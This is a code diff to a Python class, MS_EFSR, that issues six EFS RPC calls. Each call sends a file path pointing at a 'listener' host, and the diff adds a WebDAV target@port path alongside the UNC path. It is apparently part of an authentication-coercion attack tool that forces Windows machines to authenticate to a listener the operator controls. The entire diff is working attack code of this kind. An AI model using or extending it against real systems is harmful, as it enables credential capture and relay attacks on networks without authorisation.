@@ -111,7 +111,10 @@ class MS_EFSR(RPCProtocol):
                 sys.stdout.flush()
                 try:
                     request = EfsRpcOpenFileRaw()
-                    request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
+                    if self.webdav_target is not None and self.webdav_port is not None:
+                        request['FileName'] = '%s@%d/%s/file.txt\x00' % (self.webdav_target, self.webdav_port, gen_random_name())
+                    else:
+                        request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                     request['Flags'] = 0
                     if self.debug:
                         request.dump()
@@ -144,7 +147,10 @@ class MS_EFSR(RPCProtocol):
                 sys.stdout.flush()
                 try:
                     request = EfsRpcEncryptFileSrv()
-                    request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
+                    if self.webdav_target is not None and self.webdav_port is not None:
+                        request['FileName'] = '%s@%d/%s/file.txt\x00' % (self.webdav_target, self.webdav_port, gen_random_name())
+                    else:
+                        request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                     if self.debug:
                         request.dump()
                     resp = self.dce.request(request)
@@ -177,7 +183,10 @@ class MS_EFSR(RPCProtocol):
                 sys.stdout.flush()
                 try:
                     request = EfsRpcDecryptFileSrv()
-                    request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
+                    if self.webdav_target is not None and self.webdav_port is not None:
+                        request['FileName'] = '%s@%d/%s/file.txt\x00' % (self.webdav_target, self.webdav_port, gen_random_name())
+                    else:
+                        request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                     request['long'] = 0
                     if self.debug:
                         request.dump()
@@ -210,7 +219,10 @@ class MS_EFSR(RPCProtocol):
                 sys.stdout.flush()
                 try:
                     request = EfsRpcQueryUsersOnFile()
-                    request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
+                    if self.webdav_target is not None and self.webdav_port is not None:
+                        request['FileName'] = '%s@%d/%s/file.txt\x00' % (self.webdav_target, self.webdav_port, gen_random_name())
+                    else:
+                        request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                     if self.debug:
                         request.dump()
                     resp = self.dce.request(request)
@@ -243,7 +255,10 @@ class MS_EFSR(RPCProtocol):
                 sys.stdout.flush()
                 try:
                     request = EfsRpcQueryRecoveryAgents()
-                    request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
+                    if self.webdav_target is not None and self.webdav_port is not None:
+                        request['FileName'] = '%s@%d/%s/file.txt\x00' % (self.webdav_target, self.webdav_port, gen_random_name())
+                    else:
+                        request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                     if self.debug:
                         request.dump()
                     resp = self.dce.request(request)
@@ -275,7 +290,10 @@ class MS_EFSR(RPCProtocol):
                 sys.stdout.flush()
                 try:
                     request = EfsRpcFileKeyInfo()
-                    request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
+                    if self.webdav_target is not None and self.webdav_port is not None:
+                        request['FileName'] = '%s@%d/%s/file.txt\x00' % (self.webdav_target, self.webdav_port, gen_random_name())
+                    else:
+                        request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                     request['InfoClass'] = 0
                     if self.debug:
                         request.dump()
